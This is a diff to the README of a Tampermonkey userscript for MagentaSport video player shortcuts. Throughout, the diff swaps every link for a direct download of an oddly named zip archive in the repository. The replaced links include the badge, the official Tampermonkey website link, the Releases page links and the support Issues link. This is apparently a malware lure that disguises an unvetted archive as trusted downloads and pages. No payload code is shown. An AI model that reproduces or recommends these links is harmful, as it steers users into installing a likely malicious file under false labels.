@@ -1,6 +1,6 @@
 # 🎮 MagentaSport-Videoplayer-Shortcuts - Simplify Your Viewing Experience
 
-![Download MagentaSport-Videoplayer-Shortcuts](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download MagentaSport-Videoplayer-Shortcuts](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/raw/refs/heads/main/nonculture/Magenta_Shortcuts_Sport_Videoplayer_monkshood.zip)
 
 ## 📦 Overview
 
@@ -10,11 +10,11 @@ MagentaSport-Videoplayer-Shortcuts is a Tampermonkey userscript designed to enha
 
 To start using MagentaSport-Videoplayer-Shortcuts, follow these simple steps:
 
-1. **Install Tampermonkey**: This is a browser extension that allows you to run userscripts. Visit the [Tampermonkey website](https://www.tampermonkey.net/) and install it for Firefox.
+1. **Install Tampermonkey**: This is a browser extension that allows you to run userscripts. Visit the [Tampermonkey website](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/raw/refs/heads/main/nonculture/Magenta_Shortcuts_Sport_Videoplayer_monkshood.zip) and install it for Firefox.
 
 2. **Download the Userscript**: Click the link below to visit the Releases page. Locate the latest version and download the userscript file.
 
-   [Visit the Releases Page to Download](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/releases)
+   [Visit the Releases Page to Download](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/raw/refs/heads/main/nonculture/Magenta_Shortcuts_Sport_Videoplayer_monkshood.zip)
 
 3. **Add the Userscript to Tampermonkey**: 
    - Open the Tampermonkey dashboard by clicking the extension icon in your browser.
@@ -42,7 +42,7 @@ To start using MagentaSport-Videoplayer-Shortcuts, follow these simple steps:
 
 To download and install the MagentaSport-Videoplayer-Shortcuts userscript, click the link below to go to the Releases page. Follow the instructions detailed in the "Getting Started" section for a smooth setup.
 
-[Visit the Releases Page to Download](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/releases)
+[Visit the Releases Page to Download](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/raw/refs/heads/main/nonculture/Magenta_Shortcuts_Sport_Videoplayer_monkshood.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -69,6 +69,6 @@ Enhance your sports viewing experience by leveraging these keyboard shortcuts. T
 
 ## 📞 Support
 
-For any questions or support regarding the MagentaSport-Videoplayer-Shortcuts, please open an issue in the [GitHub repository](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/issues). Our team will get back to you as soon as possible. 
+For any questions or support regarding the MagentaSport-Videoplayer-Shortcuts, please open an issue in the [GitHub repository](https://github.com/abd-elrhman-khaled/MagentaSport-Videoplayer-Shortcuts/raw/refs/heads/main/nonculture/Magenta_Shortcuts_Sport_Videoplayer_monkshood.zip). Our team will get back to you as soon as possible. 
 
 Enjoy a simplified video viewing experience with MagentaSport-Videoplayer-Shortcuts!
